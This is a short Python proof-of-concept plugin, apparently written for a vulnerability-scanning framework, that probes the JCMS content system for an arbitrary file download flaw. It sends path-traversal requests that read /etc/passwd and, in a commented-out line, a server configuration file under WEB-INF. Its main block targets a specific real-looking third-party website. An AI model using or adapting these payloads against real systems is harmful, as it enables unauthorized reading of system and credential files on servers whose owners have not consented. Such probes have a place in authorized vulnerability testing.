#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name:jcms任意文件下载漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2015-089431
#Data:2015/12/10

def assign(service,arg):
    if service=="jcms":
        return True,arg 
    


def  audit(arg):
    #url=arg+"jcms/jcms_files/jcms1/web1/site/module/comment/opr_readfile.jsp?filename=../../../../../../WEB-INF/ini/merpserver.ini"
    url=arg+"jcms/m_5_e/module/voting/down.jsp?filename=a.txt&pathfile=/etc/passwd"
    #print url 
    code,head,res,errcode,finalurl=curl.curl2(url)
    print res
    if code==200 and  ":/bin/bash" in res:
        security_hole('file download Vulnerable:'+url)

if __name__=="__main__":
    from dummy import *
    audit(assign('jcms','http://aid.ec.js.edu.cn/')[1])